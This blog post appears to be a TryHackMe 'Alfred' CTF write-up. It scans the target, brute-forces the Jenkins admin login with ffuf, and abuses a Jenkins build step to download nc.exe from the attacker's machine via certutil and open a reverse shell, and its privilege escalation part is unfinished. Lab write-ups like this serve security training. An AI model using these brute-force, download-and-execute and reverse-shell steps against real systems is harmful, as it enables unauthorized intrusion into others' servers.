---
layout: post
description: Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.
title: Tryhackme Alfred CTF Writeup
date: 2021-12-28 11:40
image: '/assets/img/posts/tryhackme-alfred-ctf-writeup/alfredbanner.png'
tags: [TryHackme-Machines]
featured: false
---


# Enumeration

Run Network Mapper (**nmap**) on Alfred machine to discover opened ports and services.   

Full command : 
{% highlight bash %}
nmap -sV -sS -O -T4 -p- {machine IP} -Pn -oN {outputfile}
{% endhighlight %}

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|-sV                     | Probe open ports to determine service/version info     |
|-sS                     | SYN, half TCP scan                                     |
|-O                      | Enable OS detection                                    |
|-T4                     | T{0-5} Set scan speed, higher is faster                |
|-p-                     | Scan all 65536 ports                                   |
|-Pn                     | Skip host discovery                                    |
|-oN                     | Write output to a file                                 |

Output of the scan:
{% highlight bash %}
# Nmap 7.92 scan initiated Tue Dec 28 09:22:17 2021 as: nmap -sV -sS -O -T4 -p- -Pn -oN alfred.nmap 10.10.195.99
Nmap scan report for 10.10.195.99
Host is up (0.030s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 28 09:24:13 2021 -- 1 IP address (1 host up) scanned in 115.63 seconds
{% endhighlight %}

Three ports are opened:
## Port 80 http Microsoft IIS httpd 7.5
Ordinary [**Microsoft IIS**](https://en.wikipedia.org/wiki/Internet_Information_Services) web server.
<br>Nothing fancy here.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/2.png)

## Port 3389 tcpwrapped
**tcpwrapped** means that the remote host closed the connection after completing the TCP three-way handshake without receiving any data.
<br>[**More information here**.](https://secwiki.org/w/FAQ_tcpwrapped)

## Port 8080 Jetty 9.4.z-SNAPSHOT

There is a [**Jenkins**](https://www.geeksforgeeks.org/what-is-jenkins/) login prompt on port 8080.
<br>![](/assets/img/posts/tryhackme-alfred-ctf-writeup/3.png)<br>
If you google it, you will see the default login credentials for Jenkins is **admin** for the username and **admin** for the password.
However, the system administrator could have changed the password to a different one. In that case default credentials
would be useless. So we will brute force the credentials for best practice.<br>

# Exploitation

In order to create a continuous HTTP request, we have to know how the HTTP request looks.
Launch the [**Burp Suite**](https://www.geeksforgeeks.org/what-is-burp-suite/) to examine the HTTP POST request sent 
when a login attempt occurs.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/4.png)_Request_<br><br>
There are three fields we have to make sure they are being sent with the HTTP request we will forge for this form.
1. [**application/x-www-form-urlencoded**](https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4) : Encoding type
2. **j_username** : Username field
3. **j_password** : Password Field

I will use [**ffuf**](https://cybersecnerds.com/ffuf-everything-you-need-to-know/) to create POST requests toward the web server.
You can use any fuzzer tool like **THC Hydra**, **Burp Suite** or others. 
<br>Download [**SecLists**](https://github.com/danielmiessler/SecLists) repo with prepeared wordlists included.

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|-w                      | Dedicated wordlists                                    |
|-u                      | Target URL                                             |
|-data                   | Data which will be sent with the request               |
|-H                      | HTTP headers that will be sent with the request        |
|-fr                     | Regex which will be filtered out                       |


Full command:
{% highlight bash %}
ffuf -w SecLists/Usernames/top-usernames-shortlist.txt:W1,SecLists/Passwords/Common-Credentials/best1050.txt:W2 -u "http://10.10.56.186:8080/j_acegi_security_check" -data "j_username=W1&j_password=W2" -H "Content-Type: application/x-www-form-urlencoded" -fr "loginError"
{% endhighlight %}

![](/assets/img/posts/tryhackme-alfred-ctf-writeup/6.png)__Cracked the credentials, well done :)__<br><br>
A possible question would be, why filter out "loginError" string ? 
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/5.png)_Left: Request - Right:Response_<br><br>
That sent request got a response with [**HTTP 302 status code**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302), which is the status code for redirection.
It means whenever the application receives invalid credentials from the client; the server redirects the client to the "/loginError" URL.
Based on this, as long as the HTTP response does not include "/loginError" in it, it is safe to say we have sent a valid username-password pair
to the server.
<br><br>
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/7.png)__Login to the Jenkins panel via credentials.__

It is possible to do anything that Jenkins can do since we have an admin portal right now.However, if we could get a shell from the
system, it would be amazing.<br><br>
The way to get a shell from the system is to make Jenkins transmit and execute code in the system shell.<br>
Click on the first project named as **project**, then click **configure**.
Scroll down to the bottom, and you will see a box that executes the windows command written in it.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/9.png)<br>
On the project page, there is a **Build History** section. It is available to check the output of the batch command that had run.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/8.png)
Now, instead of printing the string value of the user who executes it with the **whoami** command, we have to connect to that shell.

<br>I will use [**Netcat**](https://www.ionos.com/digitalguide/server/tools/netcat/) in this manner. It is required to have Netcat downloaded in both the attacker and the
victim machine.
- Download static [**nc.exe**](https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe) binary for to run it in the victim machine 
- Start a Python3 server in the directory that includes the Netcat static binary file.
<br>Run:
{% highlight shell%}
sudo python3 -m http.server 80
{% endhighlight %}
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/10.png)
- Start a Netcat listener in the attacker machine.
<br>Run:
{% highlight shell%}
nc -nvlp {ANY FREE PORT}
{% endhighlight %}
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/11.png)
- Download the static binary to the victim machine from the Python web server and run it.
{% highlight powershell%}
certutil.exe -urlcache -split -f http://{THM IP}:80/nc.exe
{% endhighlight %}
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/12.png)
- Click **Build** button on the project page.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/13.png)

A get request was made to the web server.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/14.png)
Then we got the shell.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/15.png)__We are in, nice progress ;)__
To get user flag, run:
{% highlight powershell %}
type "C:\Users\Bruce\Desktop\user.txt"
{% endhighlight%}

# Privilege Escelation
To be continued...
